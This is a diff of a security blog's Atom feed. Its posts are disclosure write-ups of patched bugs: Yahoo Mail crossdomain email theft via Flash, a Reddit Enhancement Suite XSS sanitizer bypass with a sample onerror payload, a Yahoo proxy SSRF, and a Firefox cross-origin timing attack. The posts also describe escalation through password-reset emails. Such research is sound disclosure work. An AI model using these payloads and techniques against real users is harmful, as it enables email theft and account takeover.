+<p><a href="https://ca-mg6.mail.yahoo.com/neo/ws/sd?/v1/user/me/contacts;count=max;sort=asc?format=json&amp;view=compact&amp;_sc=1">Some</a> alternative <a href="https://ca-mg6.mail.yahoo.com/neo/ws/sd?/v1/user/me/profile;count=max;sort=asc?format=json&amp;_sc=1">endpoints</a> for the <a href="https://developer.yahoo.com/social/">Social API</a> fit the bill nicely. They let us fetch the current user&rsquo;s contacts and profile without requiring an auth token or user ID. You can see those leaking to a page we control here:</p>
+
+<p><a href="http://blog.saynotolinux.com/images/posts/ymail_again/justsocialstuff.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/ymail_again/justsocialstuff.png" width="640" height="480"></a></p>
+
+<h2>But What About Mail?</h2>
+
+<p>One that stumped me for a long time was getting the user&rsquo;s mail. All of the endpoints for mail listings required a valid WSSID (web services session id?) Unfortunately, all the endpoints I could find that would give me one had non-200 response codes or wouldn&rsquo;t parse as XML. I eventually found what I was looking for by running YMail&rsquo;s android app through mitmproxy. <a href="https://m.mg.mail.yahoo.com/hg/controller/controller.php">Here you can see the WSSID we wanted</a>, returned with a 200 response code. Even though this endpoint&rsquo;s normally requested with a <code>POST</code> method, a <code>GET</code> with no params still gives us the WSSID&hellip; Sweet!</p>
+
+<p><a href="http://blog.saynotolinux.com/images/posts/ymail_again/ymail-mitm.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/ymail_again/ymail-mitm.png" width="640" height="480"></a></p>
+
+<p>Let&rsquo;s leak the user&rsquo;s mail now. We&rsquo;ve got a search endpoint here that will return mail fragments without embedded HTML. You can see you&rsquo;ll still sometimes get angle brackets in the response due to inline replies, but you can muck with the query to get around those.</p>
+
+<p><a href="http://blog.saynotolinux.com/images/posts/ymail_again/search-endpoint.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/ymail_again/search-endpoint.png" width="640" height="480"></a></p>
+
+<p>Now, that WSSID functions as a CSRF token as well, so we can now do anything we want as the current user. We can send mail as them, delete all their emails, basically anything a normal user can do.</p>
+
+<p>Here&rsquo;s a small page demonstrating a bunch of things we can do as long as the user is on a page we control. As you can see, We&rsquo;ve got the full list of contacts, all of the user&rsquo;s personal details including their email address and name, and a listing of their emails.</p>
+
+<p><a href="http://blog.saynotolinux.com/images/posts/ymail_again/show-all.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/ymail_again/show-all.png" width="640" height="480"></a></p>
+
+<p>We&rsquo;ve got enough for a fully-weaponized exploit at this point. We can not only leak their emails, we can also achieve lateral movement by triggering password resets on other services they use, and pulling the reset URLs right out of their email, then deleting them. Of course, previously emailed username/password combos are fair game, too. Very handy for the APT folks ;)</p>
+
+<h2>The Fix</h2>
+
+<p><code>hotspotgallery.swf</code>&rsquo;s allowDomain call has since been changed to <code>Security.allowDomain("sp.yimg.com")</code>, but doesn&rsquo;t fix the core issue. There are thousands and thousands of forgotten .swfs on disused subdomains, many of which are probably vulnerable to similar exploits. As long as those <code>crossdomain.xml</code> rules are as loose as they are, it&rsquo;s only a matter of time before someone finds one and exploits YMail again.</p>
+
+<p>.swfs that actually need crossorigin access to YMail should be moved to the existing <code>mail.yimg.com</code> subdomain, and the <code>crossdomain.xml</code> should be tightened up to keep YMail safe from rogue galleries of Asian imports and pet shows.</p>
+
+<h2>About Yahoo!&rsquo;s Initial Response</h2>
+
+<p>The other thing I want to mention is the initial response I got. I initially submitted an overview of the issue and attached a proof-of-concept that put the JSON from the contacts endpoint in a textbox. Very rudimentary, but sufficient to show crossorigin data leakage. All I got in response was a form reply basically saying &ldquo;This is intended behaviour, wontfix&rdquo;. I replied asking why they thought that, and if they had any issues reproducing the exploit.</p>
+
+<p>I know that reproing Flash issues can be a pain in the ass, and I realized the PoC would break if served from localhost, so I hosted a version that leaked the data out to JS so there was nothing for them to set up. I posted a link to the new PoC, reiterating what was being leaked. Still no response. It wasn&rsquo;t until I posted the version that leaked mail contents 8 months later that I got an unscripted reply.</p>
+
+<p>I get that Yahoo! probably receives tons of spurious reports every day, but without something actionable like &ldquo;I don&rsquo;t think X is a bug because Y&rdquo; or &ldquo;I&rsquo;m unable to reproduce the issue and Z happens&rdquo;, reporters don&rsquo;t have anything to go on if they&rsquo;re reporting a genuine issue. If they get stonewalled without any feedback on what the issue is with the report, their only way to potentially get the bug fixed is through public disclosure (which an operator of a bug bounty probably doesn&rsquo;t want.) I know this isn&rsquo;t an isolated case either, since I recently saw a presentation where an RCE on Yahoo!&rsquo;s reverse proxies got the same treatment.</p>
+
+<p>To Yahoo&rsquo;s credit, the fellow who responded to my updated proof-of-concept was decently communicative, but every response I&rsquo;d ever received from Yahoo up &lsquo;til that point had been a scripted response of &ldquo;fixed&rdquo;, &ldquo;wontfix&rdquo;, &ldquo;confirmed&rdquo;, or &ldquo;new&rdquo;. When I work with a company (either as a consultant or just through one-off reports,) nothing impresses me more than engineers responding with additional details relevant to my reports, and nothing turns me off more than the company being difficult to communicate with, money or no.</p>
+
+<h2>Tips For Bug Bounty Participants</h2>
+
+<ul>
+<li>Until the <code>crossdomain.xml</code>s are fixed, all .swfs and endpoints where the whole response body is controlled are extra-juicy targets</li>
+<li>Vulnerable .swfs normally served from random subdomains of <code>yimg.com</code> may be available on <code>l.yimg.com</code>, or even subdomains of <code>yahoo.com</code></li>
+<li>There are plenty of versioned .swfs (think branded video players and such) where the old versions are still live on <code>yimg.com</code>. I never bothered auditing them because they&rsquo;re a pain to trace through, but the WayBack machine is your friend when it comes to finding orphaned .swfs</li>
+<li>As usual, endpoints for mobile apps represent some extra attack surface to play with, and a lot of them use regular cookie auth. Set up mitmproxy or burp and go nuts.</li>
+</ul>
+
+
+<h2>Disclosure Timeline</h2>
+
+<ul>
+<li>2014-02-09: Reported issue to vendor with PoC showing contacts leakage</li>
+<li>2014-02-14: Vendor closed issue as expected behaviour</li>
+<li>2014-02-14: Requested clarification from vendor</li>
+<li>2014-03-01: Sent vendor a link to updated PoC with no setup required</li>
+<li>2014-10-30: Requested public disclosure of issue on HackerOne</li>
+<li>2014-11-04: Sent vendor a link to updated PoC showing mail leaking</li>
+<li>2014-11-07: Vendor confirmed, reopened issue</li>
+<li>2014-11-14: Engaging multimedia experience detailing issue sent to vendor, per request</li>
+<li>2014-12-03: Vendor reported issue as fixed, awarded bounty of $2500</li>
+<li>2014-12-03: Confirmed hotspotgallery.swf was no longer vulnerable</li>
+</ul>
+
+
+<h2>Related Links</h2>
+
+<ul>
+<li><a href="https://hackerone.com/reports/1171">HackerOne report (currently private)</a></li>
+<li><a href="http://saynotolinux.com/tests/yahoo/mail_theft_2014_11_2/">Comprehensive PoC</a></li>
+<li><a href="https://gist.github.com/JordanMilne/e14cf1dcd4bfbd85275e">Comprehensive PoC source</a></li>
+<li><a href="https://gist.github.com/JordanMilne/145722dd2ca31bc96f86">Decompiled hotspotgallery.swf</a></li>
+</ul>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Spooky Sanitization Stories: Analyzing the XSS Flaw in Reddit Enhancement Suite]]></title>
+    <link href="http://blog.saynotolinux.com/blog/2014/04/12/spooky-sanitizer-stories-analyzing-the-reddit-enhancement-suite-xss-flaw/"/>
+    <updated>2014-04-12T00:04:22-03:00</updated>
+    <id>http://blog.saynotolinux.com/blog/2014/04/12/spooky-sanitizer-stories-analyzing-the-reddit-enhancement-suite-xss-flaw</id>
+    <content type="html"><![CDATA[<h2>TL;DR</h2>
 
 <p>The library that <a href="http://redditenhancementsuite.com/">Reddit Enhancement Suite</a> (a browser extension for reddit users) used for HTML sanitization had a bug that bit them pretty hard, enabling DOM-based XSS of 1.5~ million reddit users. RES pushed out a fixed version, and reddit deployed a script to prevent users of the old version from accidentally getting exploited; thus preventing an XSS worm.</p>
 
-<a name="Introduction"></a>
 <h2>Introduction</h2>
 
 <p>If you&rsquo;re a user of Reddit Enhancement Suite, chances are you recently saw this big scary alert() box when you tried to click an expando button:</p>
 
-<p><a href="http://JordanMilne.github.io/images/posts/res-xss/alert.png"><img class="center" src="http://JordanMilne.github.io/images/posts/res-xss/alert.png"></a></p>
+<p><a href="http://blog.saynotolinux.com/images/posts/res-xss/alert.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/res-xss/alert.png"></a></p>
 
 <p>For those who aren&rsquo;t familiar with RES, an expando is an inline preview of offsite content, or content that would normally require a clickthrough, that can be viewed by pressing an &ldquo;expando&rdquo; button:</p>
 
-<p><a href="http://JordanMilne.github.io/images/posts/res-xss/expandos.jpg"><img class="center" src="http://JordanMilne.github.io/images/posts/res-xss/expandos.jpg"></a></p>
+<p><a href="http://blog.saynotolinux.com/images/posts/res-xss/expandos.jpg"><img class="center" src="http://blog.saynotolinux.com/images/posts/res-xss/expandos.jpg"></a></p>
 
 <p>A few people have asked questions like &ldquo;why am I getting that alert?&rdquo;, &ldquo;what exactly is this bug?&rdquo;, &ldquo;why can&rsquo;t I just use the vulnerable version anyways?&rdquo;. Rather than respond to each question separately, I decided to write something that would hopefully answer everyone&rsquo;s questions at once.</p>
 
 <!--more-->
 
 
-<a name="Unusual.Beginnings"></a>
 <h2>Unusual Beginnings</h2>
 
 <p>Interestingly, the most important part of the RES exploit wasn&rsquo;t found by looking at RES at all. I actually found it by poking around reddit&rsquo;s markdown library, <a href="https://github.com/reddit/snudown">Snudown</a>. Snudown is mostly written in C, and is a fork of the <a href="https://github.com/vmg/sundown">Sundown</a> markdown library. Snudown departs from Sundown in a number of ways, the most important to us being that it adds the ability to include a <a href="https://github.com/reddit/snudown/blob/master/snudown.c#L36">restricted subset of HTML</a> alongside your markdown. On reddit, markdown with inline HTML may only be used on the wiki, as it&rsquo;s intended to allow using HTML tables instead of Sundown&rsquo;s <a href="http://michelf.ca/projects/php-markdown/extra/#table">unwieldly markdown tables</a>.</p>
 
-<a name="Taking.Apart.the.Sanitizer"></a>
 <h2>Taking Apart the Sanitizer</h2>
 
 <p>So let&rsquo;s go into a simplified view of <a href="https://github.com/reddit/snudown/blob/30fee253240199f46f4f30aa3284dd1e92136ef2/html/html.c#L391">how Snudown did attribute whitelisting</a>. Snudown scanned everything after the tag name, and before a <code>&gt;</code> for valid <code>attr=value</code> pairs, reading everything into the <code>attr</code> buffer as it went. Once Snudown realized it was not dealing with a valid valid/value pair, it would clear the attr buffer and start looking for the next valid pair. Once it decided it had hit the end of the value (by encountering a space outside the quotes, or a <code>&gt;</code> anywhere), it would output everything in the <code>attr</code> buffer, clear it, then continue parsing attributes. Some interesting consequences of the process, <code>&lt;table scope==   scope=bar&gt;</code> was sanitized to <code>&lt;table scope=bar&gt;</code>,  and <code>&lt;table bad=scope="bar"&gt;</code> was sanitized to <code>&lt;table scope="bar"&gt;</code>.</p>
 
 <p>Those outputs aren&rsquo;t consistent with most HTML parsers, but the biggest issue was how it handled quotes: Snudown saw <code>&lt;table scope=a' bar=baz'&gt;</code> as a <code>table</code> with a single <code>scope</code> attribute, but every mainstream browser sees this as a <code>table</code> with both <code>scope</code> and <code>bar</code> attributes. Quotes are only treated as attribute delimiters when they occur at the <em>beginning</em> of the value, otherwise whitespace is the delimiter. Since Snudown was outputting every validated attr/value pair verbatim, we could abuse this behaviour to sneak attributes like <code>onmouseover</code> by the whitelist!</p>
 
-<a name="So.wait..this.was.an.XSS.on.reddit.s.wikis."></a>
 <h2>So wait, this was an XSS on reddit&rsquo;s wikis?</h2>
 
 <p>No. See, even though Snudown performs its own sanitization on inline HTML, Snudown&rsquo;s output generally isn&rsquo;t trusted within reddit&rsquo;s codebase. All of the HTML that comes out of Snudown gets put through a <a href="https://github.com/reddit/reddit/blob/5cbea9cdf401f1602394c16b2a8384205962032d/r2/r2/lib/filters.py#L201">SAX / BeautifulSoup-based sanitizer</a> that validates the HTML and reserializes it in a way that&rsquo;s unambiguous across browsers. For example, the ambiguous:</p>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;table</span> <span class="na">scope=</span><span class="s">`bar</span> <span class="na">cellspacing=</span><span class="s">&#39;` baz=heyIE ignore=a&#39;</span><span class="nt">&gt;</span>
-</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;table scope=`bar cellspacing='` baz=heyIE ignore=a'></span></code></pre></td></tr></table></div></figure>
 
-
-<p></p>
 
 <p>passes both validation steps, but becomes the unambiguous:</p>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;table</span> <span class="na">scope=</span><span class="s">&quot;`bar&quot;</span> <span class="na">cellspacing=</span><span class="s">&quot;` baz=heyIE ignore=a&#39;&quot;</span><span class="nt">&gt;</span>
-</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;table scope="`bar" cellspacing="` baz=heyIE ignore=a'"></span></code></pre></td></tr></table></div></figure>
 
-
-<p></p>
 
 <p>when reserialized by reddit&rsquo;s SAX sanitizer.</p>
 
 <p>To reiterate, though reddit used Snudown&rsquo;s wiki rendering mode, <em>reddit was never vulnerable to XSS</em> due to additional precautions taken with its output.</p>
 
-<a name="But.what.does.any.of.this.have.to.do.with.RES..image.expandos."></a>
 <h2>But what does any of this have to do with RES&#8217; image expandos?</h2>
 
 <p>I knew that reddit itself wasn&rsquo;t vulnerable, so before I did anything, I wanted to check if anyone else was using Snudown&rsquo;s wiki rendering mode in production, outside of users of the reddit codebase. One thing that kept popping up was <a href="https://github.com/gamefreak/snuownd">SnuOwnd</a>, a faithful port of Snudown (with all its quirks) to JS. As some of you may have noticed from the RES changelogs, the Reddit Enhancement Suite also includes SnuOwnd. RES actually uses SnuOwnd for a number of things, and that used to include <a href="https://github.com/honestbleeps/Reddit-Enhancement-Suite/blob/e13760edbdb7837b47638c38010cf0e8ba40fb2d/lib/utils.js#L501">HTML sanitization</a>:</p>
@@ -166,7 +568,6 @@
 
 <p>Even if we can&rsquo;t get an XSS on reddit.com proper, RES is still a pretty juicy target. With <a href="https://chrome.google.com/webstore/detail/reddit-enhancement-suite/kbmfpngjjgdllneeigpgjifpgocmfgmb">an install base of 1.5~ million users</a> — which includes a good chunk of reddit&rsquo;s moderators — an XSS in RES could do a lot of damage.</p>
 
-<a name="Finding.the.Attack.Vector"></a>
 <h2>Finding the Attack Vector</h2>
 
 <p>Now all that&rsquo;s left is to find where safeHTML or sanitizeHTML are passed untrusted data, and we&rsquo;ve got ourselves an XSS via extension. If it wasn&rsquo;t apparent from the alert dialog, that injection point is in RES&#8217; expandos:</p>
@@ -212,14 +613,12 @@
 
 <p>RES supports expanding text posts from Tumblr inline, and Tumblr allows us to use valid HTML in post titles, so if we <a href="http://tumblbustinator.tumblr.com/post/81275599702/foobar">made a post</a> with the title <code>Foobar &lt;img src=foo' onerror="alert(1)" ' /&gt;</code>, <code>alert(1)</code> would be called when they expanded our link:</p>
 
-<p><a href="http://JordanMilne.github.io/images/posts/res-xss/xssd.png"><img class="center" src="http://JordanMilne.github.io/images/posts/res-xss/xssd.png"></a></p>
+<p><a href="http://blog.saynotolinux.com/images/posts/res-xss/xssd.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/res-xss/xssd.png"></a></p>
 
-<a name="Worst-case.Scenario"></a>
 <h2>Worst-case Scenario</h2>
 
 <p>This was about as bad as it gets without having a zero-interaction XSS. Comment pages have a &ldquo;Show Images&rdquo; button that expands all images on the page, and those get used a <em>lot</em> for picture threads. Had someone posted a child comment to one of the top comments with a link to the payload, they could have easily started an XSS worm that spammed links to the payload in other threads. Once it spread, the worm could have done things like upvote specific submissions, nuke a subreddit if a moderator got exploited, etc.</p>
 
-<a name="The.Fix"></a>
 <h2>The Fix</h2>
 
 <p>This bug required fixes in a number of places to keep it fully closed. First, <a href="https://github.com/reddit/snudown/commit/62bfa4ad673c4f19683ed91c5ebb093bbe9f581d">Snudown&rsquo;s HTML sanitization was changed</a> to first parse the attributes, then unambiguously reserialize its interpretation. That fix was then <a href="https://github.com/honestbleeps/Reddit-Enhancement-Suite/commit/de3f84cac524c473e08d72517dc1d75f26906507">ported to SnuOwnd&rsquo;s JS implementation</a>.</p>
@@ -287,7 +686,6 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<a name="Closing.Notes"></a>
 <h2>Closing Notes</h2>
 
 <ul>
@@ -299,7 +697,6 @@
 </ul>
 
 
-<a name="Further.reading"></a>
 <h2>Further reading</h2>
 
 <p><a href="http://blog.kotowicz.net/2013/12/rapportive-xsses-gmail-or-have-yourself.html">Another example of DOM-based XSS via extensions</a></p>
@@ -308,12 +705,11 @@
   
   <entry>
     <title type="html"><![CDATA[Yahoo's Pet Show of Horrors: Leaking a User's Emails Crossdomain]]></title>
-    <link href="http://JordanMilne.github.io/2014/03/01/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email/"/>
+    <link href="http://blog.saynotolinux.com/blog/2014/03/01/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email/"/>
     <updated>2014-03-01T01:12:17-04:00</updated>
-    <id>http://JordanMilne.github.io/2014/03/01/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email</id>
+    <id>http://blog.saynotolinux.com/blog/2014/03/01/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email</id>
     <content type="html"><![CDATA[<p>I&rsquo;m taking a break from browser security posts while I wait for vendors to patch, so the next few posts are probably going to be about web app security. Hopefully I should have some posts about architectural flaws in browsers / plugins by next month.</p>
 
-<a name="Initial.Discovery"></a>
 <h2>Initial Discovery</h2>
 
 <p>Since Yahoo <a href="http://yahoodevelopers.tumblr.com/post/65622522325/the-bug-bounty-program-is-now-live">recently revamped their Responsible Disclosure program</a>, I figured I&rsquo;d have a go at finding some vulnerabilities. All of <code>*.yahoo.com</code> is in scope, and Yahoo has a <em>lot</em> of legacy behind it, so I started going through the more obscure subdomains manually. One of the subdomains I looked at a lot was <code>hk.promotions.yahoo.com</code>. It&rsquo;s a good place to look because it has lots of PHP scripts and Flash, it looks like it wasn&rsquo;t done by Yahoo&rsquo;s core devs, and most auditors aren&rsquo;t looking there since its content is mostly in Chinese.</p>
@@ -323,7 +719,7 @@
 
 <p>I ended up on <code>http://hk.promotions.yahoo.com/petshow2011/</code>, apparently a page for a Hongkongese pet show that happened in 2011:</p>
 
-<p><a href="http://JordanMilne.github.io/images/posts/petshow/petshow0.png"><img class="center" src="http://JordanMilne.github.io/images/posts/petshow/petshow0.png" width="640" height="480"></a></p>
+<p><a href="http://blog.saynotolinux.com/images/posts/petshow/petshow0.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/petshow/petshow0.png" width="640" height="480"></a></p>
 
 <p>As you can see from the request log, something on the page was requesting data from another domain through a crossdomain proxy: <code>http://hk.promotions.yahoo.com/petshow2011/php/getImages.php?file=&lt;url&gt;</code>.</p>
 
@@ -331,11 +727,10 @@
 
 <p>Second, since the proxy doesn&rsquo;t set a <code>Content-Type</code> on the response and we control the response body, we&rsquo;ve got XSS on <code>hk.promotions.yahoo.com</code> thanks to type sniffing!</p>
 
-<p><a href="http://JordanMilne.github.io/images/posts/petshow/petshow2.png"><img class="center" src="http://JordanMilne.github.io/images/posts/petshow/petshow2.png" width="640" height="480"></a></p>
+<p><a href="http://blog.saynotolinux.com/images/posts/petshow/petshow2.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/petshow/petshow2.png" width="640" height="480"></a></p>
 
-<p><a href="http://JordanMilne.github.io/images/posts/petshow/petshow3.png"><img class="center" src="http://JordanMilne.github.io/images/posts/petshow/petshow3.png"></a></p>
+<p><a href="http://blog.saynotolinux.com/images/posts/petshow/petshow3.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/petshow/petshow3.png"></a></p>
 
-<a name="Escalating.Access"></a>
 <h2>Escalating Access</h2>
 
 <p>That&rsquo;s nice and all, but XSS on a mostly-static subdomain isn&rsquo;t that interesting to me. Now, remember that we control the <em>entire</em> body of the proxy&rsquo;s response and that there&rsquo;s no <code>Content-Type</code>. That means we can <em>also</em> proxy an SWF and have it be same-origin with <code>hk.promotions.yahoo.com</code>. Why&rsquo;s a SWF any more useful to us than HTML? Because of overly-permissive <a href="http://kb2.adobe.com/cps/142/tn_14213.html">crossdomain.xml rules</a>.</p>
@@ -400,42 +795,38 @@
 
 <p>YMail actually has the <em>least</em> secure crossdomain policy of any of the subdomains that I checked. That <code>secure="false"</code> will allow SWFs served over HTTP to read resources only served over HTTPS, making the forced HTTPS a lot less useful. Per Adobe, <a href="http://www.adobe.com/devnet/adobe-media-server/articles/cross-domain-xml-for-streaming.html#articlecontentAdobe_numberedheader_0">&ldquo;Using false in an HTTPS policy file is not recommended because this compromises the security offered by HTTPS.&rdquo;</a></p>
 
-<a name="It.s.Proxies.All.the.Way.Down"></a>
 <h2>It&rsquo;s Proxies All the Way Down</h2>
 
 <p>Well, now we know we can get an arbitrary SWF same-origin with a subdomain of <code>yahoo.com</code>, and we know that SWF can read from a number of subdomains on <code>yahoo.com</code>, let&rsquo;s get some emails!</p>
 
 <p>First, we need to pick the SWF to proxy. The obvious choice for someone who doesn&rsquo;t know Flash well is a <a href="https://github.com/borisreitman/CrossXHR">SWF&lt;->JS XHR proxy</a>. These allow you to proxy requests from JS through a specialized SWF. Here was the result, with some overzealous redaction:</p>
 
-<p><a href="http://JordanMilne.github.io/images/posts/petshow/petshow4.png"><img class="center" src="http://JordanMilne.github.io/images/posts/petshow/petshow4.png" width="640"></a></p>
+<p><a href="http://blog.saynotolinux.com/images/posts/petshow/petshow4.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/petshow/petshow4.png" width="640"></a></p>
 
 <p>Looks like our proxied proxy works, the response body includes all of my test account&rsquo;s auth tokens and personal info. One of those tokens allows us to access a JSON endpoint that lists our e-mails:</p>
 
-<p><a href="http://JordanMilne.github.io/images/posts/petshow/petshow6.png"><img class="center" src="http://JordanMilne.github.io/images/posts/petshow/petshow6.png" width="640"></a></p>
+<p><a href="http://blog.saynotolinux.com/images/posts/petshow/petshow6.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/petshow/petshow6.png" width="640"></a></p>
 
 <p>and we can use those message IDs to pull up specific emails from the user&rsquo;s inbox:</p>
 
-<p><a href="http://JordanMilne.github.io/images/posts/petshow/petshow7.png"><img class="center" src="http://JordanMilne.github.io/images/posts/petshow/petshow7.png" width="640"></a></p>
+<p><a href="http://blog.saynotolinux.com/images/posts/petshow/petshow7.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/petshow/petshow7.png" width="640"></a></p>
 
 <p>and since we can read pages containing CSRF tokens, we can delete the user&rsquo;s emails, send emails as the current user, etc:</p>
 
-<p><a href="http://JordanMilne.github.io/images/posts/petshow/petshow8.png"><img class="center" src="http://JordanMilne.github.io/images/posts/petshow/petshow8.png" width="640"></a></p>
+<p><a href="http://blog.saynotolinux.com/images/posts/petshow/petshow8.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/petshow/petshow8.png" width="640"></a></p>
 
 <p>Funky. The most obvious application of this attack would be to determine the user&rsquo;s email, initiate a password reset on any &ldquo;interesting&rdquo; sites, read the password reset URL from their email, then delete the email; but there&rsquo;s plenty of others.</p>
 
-<a name="The.Fix"></a>
 <h2>The Fix</h2>
 
 <p>Well, the affected page was for a Hongkongese pet show that happened in 2011, so the fix was removing the page and its associated crossdomain proxy. I&rsquo;m disappointed that the <code>crossdomain.xml</code> rules are still as loose as they are, but I don&rsquo;t think that&rsquo;s getting changed anytime soon. Subsequent reports mentioning the <code>crossdomain.xml</code> rules have been marked WONTFIX.</p>
 
-<a name="TL.DR"></a>
 <h2>TL;DR</h2>
 
 <p>There were SSRF and crossdomain data leakage issues due to a misconfigured crossdomain proxy and overly-permissive <code>crossdomain.xml</code> rules. One was able to leak the emails of the current user, and do anything the user could do from YMail just by having them visit an attacker-controlled page.</p>
 
 <p>This instance of the issue is fixed, but the <code>crossdomain.xml</code> rules are still overly-permissive.</p>
 
-<a name="Disclosure.Timeline"></a>
 <h2>Disclosure Timeline</h2>
 
 <ul>
@@ -448,7 +839,6 @@
 </ul>
 
 
-<a name="Further.Reading"></a>
 <h2>Further Reading</h2>
 
 <ul>
@@ -462,14 +852,13 @@
   
   <entry>
     <title type="html"><![CDATA[What's That Smell? Sniffing Cross-origin Frame Content in Firefox Using Timing Attacks]]></title>
-    <link href="http://JordanMilne.github.io/2014/02/05/whats-that-smell-sniffing-cross-origin-frames-in-firefox/"/>
+    <link href="http://blog.saynotolinux.com/blog/2014/02/05/whats-that-smell-sniffing-cross-origin-frames-in-firefox/"/>
     <updated>2014-02-05T10:12:13-04:00</updated>
-    <id>http://JordanMilne.github.io/2014/02/05/whats-that-smell-sniffing-cross-origin-frames-in-firefox</id>
+    <id>http://blog.saynotolinux.com/blog/2014/02/05/whats-that-smell-sniffing-cross-origin-frames-in-firefox</id>
     <content type="html"><![CDATA[<p>Reading the blogs of <a href="http://lcamtuf.blogspot.com">lcamtuf</a> and <a href="http://scarybeastsecurity.blogspot.ca/">Chris Evans</a> is really what got me interested in browser security,
 so I&rsquo;m always on the lookout for novel cross-domain data theft vectors. Today I&rsquo;m going to go into
 the discovery and exploitation of such a bug: A timing attack on Firefox&rsquo;s <code>document.elementFromPoint</code> and <code>document.caretPositionFromPoint</code> implementations.</p>
 
-<a name="Initial.Discovery"></a>
 <h2>Initial Discovery</h2>
 
 <p>I was looking at ways to automatically exploit another bug that required user interaction when I noticed <a href="https://developer.mozilla.org/en-US/docs/Web/API/document.elementFromPoint">elementFromPoint</a> and
@@ -508,7 +897,7 @@ Curious as to how they behaved with frames, I did a little testing.</p>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p><a href="http://JordanMilne.github.io/images/posts/frompoint/obj_inspector.png"><img class="center" src="http://JordanMilne.github.io/images/posts/frompoint/obj_inspector.png"></a></p>
+<p><a href="http://blog.saynotolinux.com/images/posts/frompoint/obj_inspector.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/frompoint/obj_inspector.png"></a></p>
 
 <p>But there was a small snag: I couldn&rsquo;t actually access the <code>CaretPosition</code>&rsquo;s <code>offsetNode</code> from JS without getting a security exception.
 It seems that Firefox noticed that <code>offsetNode</code> was being set to an element from a cross-origin document, and wrapped the <code>CaretPosition</code> object
@@ -520,7 +909,7 @@ tells us how large the framed document is, and also allows us to leak which elem
 
 <p>For example here&rsquo;s what we can infer about <a href="https://tomcat.apache.org/tomcat-5.5-doc/ssl-howto.html#Create_a_local_Certificate_Signing_Request_(CSR)">https://tomcat.apache.org/tomcat-5.5-doc/ssl-howto.html#Create_a_local_Certificate_Signing_Request_(CSR)</a> through its scrollbars:</p>
 
-<p><a href="http://JordanMilne.github.io/images/posts/frompoint/nullity_test.png"><img class="center" src="http://JordanMilne.github.io/images/posts/frompoint/nullity_test.png" width="600" height="600"></a></p>
+<p><a href="http://blog.saynotolinux.com/images/posts/frompoint/nullity_test.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/frompoint/nullity_test.png" width="600" height="600"></a></p>
 
 <p>The vertical scrollbar thumb has obviously moved, so we know that an element with an id of <code>Create_a_local_Certificate_Signing_Request_(CSR)</code> exists in the framed document.</p>
 
@@ -545,7 +934,6 @@ tells us how large the framed document is, and also allows us to leak which elem
 </span></code></pre></td></tr></table></div></figure>
 
 
-<a name="Digging.Deeper"></a>
 <h2>Digging Deeper</h2>
 
 <p>Knowing the page&rsquo;s size and whether certain elements are present is nice, but I wanted more. I remembered <a href="http://contextis.co.uk/research/white-papers/pixel-perfect-timing-attacks-html5/">Paul Stone&rsquo;s excellent paper about timing attacks on browser renderers</a> and figured a timing attack might help us here.</p>
@@ -597,7 +985,7 @@ I guessed that the time it took for a <code>caretPositionFromPoint(x,y)</code> c
 
 <p>Once we&rsquo;ve gathered timing measurements for all of the points across the iframe, we can make a visualization of the differences:</p>
 
-<p><a href="http://JordanMilne.github.io/images/posts/frompoint/reltime.png"><img class="center" src="http://JordanMilne.github.io/images/posts/frompoint/reltime.png" width="600" height="600"></a></p>
+<p><a href="http://blog.saynotolinux.com/images/posts/frompoint/reltime.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/frompoint/reltime.png" width="600" height="600"></a></p>
 
 <p>Neat.</p>
 
@@ -606,7 +994,6 @@ I guessed that the time it took for a <code>caretPositionFromPoint(x,y)</code> c
 <p>It also seems that even though <code>elementFromPoint</code> doesn&rsquo;t return elements from the framed document, it still descends into it for its hit testing, so it&rsquo;s vulnerable to
 the same timing attack as <code>caretPositionFromPoint</code>.</p>
 
-<a name="Stealing.Text"></a>
 <h2>Stealing Text</h2>
 
 <p>So we can infer quite a bit about the framed document from the timing information, but can we actually steal text from it? Maybe, with a lot of work, depending on the page&rsquo;s styling.</p>
@@ -619,7 +1006,6 @@ the same timing attack as <code>caretPositionFromPoint</code>.</p>
 
 <p>Note that since we need to force text wrapping to get these measurements, it&rsquo;s harder to steal text from fixed-width pages, or pages that display a horizontal scrollbar instead of wrapping text (like <code>view-source:</code> URIs.) Pages that use fixed-width fonts are also more difficult to analyze because characters do not have distinct widths, we can only determine the number of characters in a word.</p>
 
-<a name="Working.Examples"></a>
 <h2>Working Examples</h2>
 
